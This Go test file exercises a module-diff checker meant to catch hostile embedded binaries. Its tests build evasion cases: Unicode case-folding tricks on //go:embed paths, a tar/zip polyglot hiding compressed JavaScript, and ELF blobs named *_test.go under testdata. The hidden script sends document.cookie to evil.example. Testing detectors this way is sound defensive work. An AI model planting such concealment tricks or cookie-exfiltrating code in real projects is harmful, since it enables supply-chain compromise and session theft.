package gomod

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"os"
	"strings"
	"testing"
)

// H1: Unicode case folding beyond strings.ToLower. On APFS (macOS)
// //go:embed ſecret.bin (LATIN SMALL LETTER LONG S) embeds secret.bin
// (go run confirmed, go1.27.4 darwin/arm64). strings.ToLower leaves U+017F
// alone, so embedMatches misses it; the tokenizer splits "ſecret.bin"
// at the non-ASCII bytes into "ecret.bin", so no mention either. The
// directive is unchanged (old and new); only secret.bin changes, and it
// is called "NO WAY TO THE BUILD FOUND" whatever its rendering.
func TestR7EmbedUnicodeFold(t *testing.T) {
	src := "//go:build darwin\n\npackage p\n\nimport _ \"embed\"\n\n//go:embed ſecret.bin\nvar payload []byte\n"
	old := writeTree(t, map[string]string{"p.go": "package p\n", "p_embed.go": src, "secret.bin": "\x00\x01old helper"})
	cur := writeTree(t, map[string]string{"p.go": "package p\n", "p_embed.go": src, "secret.bin": "\x00\x02" + strings.Repeat("NEW EVIL HELPER ", 4)})
	h := CheckTrees(old, cur)
	t.Logf("flagged: %v\ncontext:\n%s", h.flagged("m"), strings.Join(h.ctx[codeBinary]["secret.bin"], ""))
	wantPerson(t, h, "secret.bin")
}

// H1b: the testdata variant. A new darwin-only //go:embed
// testdata/ςx.bin (final sigma) embeds testdata/σx.bin (sigma) on
// APFS (go run confirmed). ToLower keeps the two sigmas apart, so the
// testdata binary is never flagged at all; main hard-stopped the new
// directive.
func TestR7EmbedUnicodeFoldTestdata(t *testing.T) {
	src := "//go:build darwin\n\npackage p\n\nimport _ \"embed\"\n\n//go:embed testdata/ςx.bin\nvar payload []byte\n"
	old := writeTree(t, map[string]string{"p.go": "package p\n"})
	cur := writeTree(t, map[string]string{"p.go": "package p\n", "p_embed.go": src, "testdata/σx.bin": "\x00\x02 NEW EVIL HELPER"})
	h := CheckTrees(old, cur)
	t.Logf("codes %v flagged: %v incomplete: %v", h.codes(), h.flagged("m"), h.items(codeIncomplete))
	if len(h.hits[codeBinary]) == 0 {
		t.Errorf("testdata/σx.bin is embedded on darwin but not flagged at all")
	}
}

// H2 end to end: the module embeds assets.bin (directive and reader code
// unchanged) and serves it through archive/zip. The new assets.bin is a
// ustar archive with a plain-text index.js, plus a zip in that member's
// padding that archive/zip reads. The item is "shown in full" (no person).
func TestR7EmbeddedTarHidesZip(t *testing.T) {
	src := "package p\n\nimport (\n\t\"archive/zip\"\n\t\"bytes\"\n\t_ \"embed\"\n)\n\n//go:embed assets.bin\nvar assets []byte\n\nfunc Open() (*zip.Reader, error) { return zip.NewReader(bytes.NewReader(assets), int64(len(assets))) }\n"
	var zb bytes.Buffer
	zw := zip.NewWriter(&zb)
	w, _ := zw.Create("index.js")
	w.Write([]byte("console.log('ok')\n"))
	zw.Close()

	var tb bytes.Buffer
	tw := tar.NewWriter(&tb)
	tw.WriteHeader(&tar.Header{Name: "index.js", Typeflag: tar.TypeReg, Size: 18, Mode: 0o644, Format: tar.FormatUSTAR})
	tw.Write([]byte("console.log('ok')\n"))
	tw.Close()
	poly := tb.Bytes()
	var hz bytes.Buffer
	hw := zip.NewWriter(&hz)
	hw.SetOffset(512 + 18)
	fw, _ := hw.CreateHeader(&zip.FileHeader{Name: "index.js", Method: zip.Deflate})
	fw.Write([]byte(hiddenJS7))
	hw.Close()
	copy(poly[512+18:], hz.Bytes())
	if dir := os.Getenv("R7_POLY_OUT"); dir != "" {
		os.WriteFile(dir+"/assets.bin", poly, 0o644)
		os.WriteFile(dir+"/p.go", []byte(src), 0o644)
	}

	old := writeTree(t, map[string]string{"p.go": src, "assets.bin": zb.String()})
	cur := writeTree(t, map[string]string{"p.go": src, "assets.bin": string(poly)})
	h := CheckTrees(old, cur)
	t.Logf("flagged %v incomplete %v\n%s", h.flagged("m"), h.items(codeIncomplete), strings.Join(h.ctx[codeBinary]["assets.bin"], ""))
	wantPerson(t, h, "assets.bin")
}

// hiddenJS7 deflates to Huffman-coded bytes, so no printable string of it
// shows in the rendering's samples.
var hiddenJS7 = "/*" + strings.Repeat("ab", 200) + "*/fetch('https://evil.example/x?c='+document.cookie);fetch('https://evil.example/x?c='+document.cookie)\n"

// H3: a binary under testdata/ whose name ends in _test.go takes the
// _test.go branch (checks.go:462-469): not flagged (testdata), not added to
// tdBins, so a non-test //go:embed testdata/blob_test.go never puts it in
// front of anyone. go run confirmed on darwin, GOOS=linux build too; no
// case-insensitive host needed. main hard-stopped the new directive.
func TestR7EmbeddedTestdataTestGoBinary(t *testing.T) {
	src := "package p\n\nimport _ \"embed\"\n\n//go:embed testdata/blob_test.go\nvar blob []byte\n"
	old := writeTree(t, map[string]string{"p.go": "package p\n"})
	cur := writeTree(t, map[string]string{"p.go": "package p\n", "p_embed.go": src, "testdata/blob_test.go": "\x7fELF\x02\x01\x01\x00EVIL-HELPER"})
	h := CheckTrees(old, cur)
	t.Logf("codes %v flagged %v incomplete %v", h.codes(), h.flagged("m"), h.items(codeIncomplete))
	if len(h.hits[codeBinary]) == 0 {
		t.Errorf("testdata/blob_test.go is embedded by non-test code but not flagged at all")
	}
}

// H3b: same, directive unchanged, only the embedded file changes: the
// module's whole flagged list is empty.
func TestR7EmbeddedTestdataTestGoBinaryUnchangedDirective(t *testing.T) {
	src := "package p\n\nimport _ \"embed\"\n\n//go:embed testdata/blob_test.go\nvar blob []byte\n"
	old := writeTree(t, map[string]string{"p.go": src, "testdata/blob_test.go": "\x7fELF\x02\x01\x01\x00old"})
	cur := writeTree(t, map[string]string{"p.go": src, "testdata/blob_test.go": "\x7fELF\x02\x01\x01\x00EVIL-HELPER"})
	h := CheckTrees(old, cur)
	t.Logf("codes %v flagged %v", h.codes(), h.flagged("m"))
	if len(h.hits[codeBinary]) == 0 {
		t.Errorf("embedded testdata/blob_test.go changed but not flagged")
	}
	// Control: the same bytes named blob.bin are flagged.
	old2 := writeTree(t, map[string]string{"p.go": strings.ReplaceAll(src, "blob_test.go", "blob.bin"), "testdata/blob.bin": "\x7fELF\x02\x01\x01\x00old"})
	cur2 := writeTree(t, map[string]string{"p.go": strings.ReplaceAll(src, "blob_test.go", "blob.bin"), "testdata/blob.bin": "\x7fELF\x02\x01\x01\x00EVIL-HELPER"})
	t.Logf("control codes %v", CheckTrees(old2, cur2).codes())
}
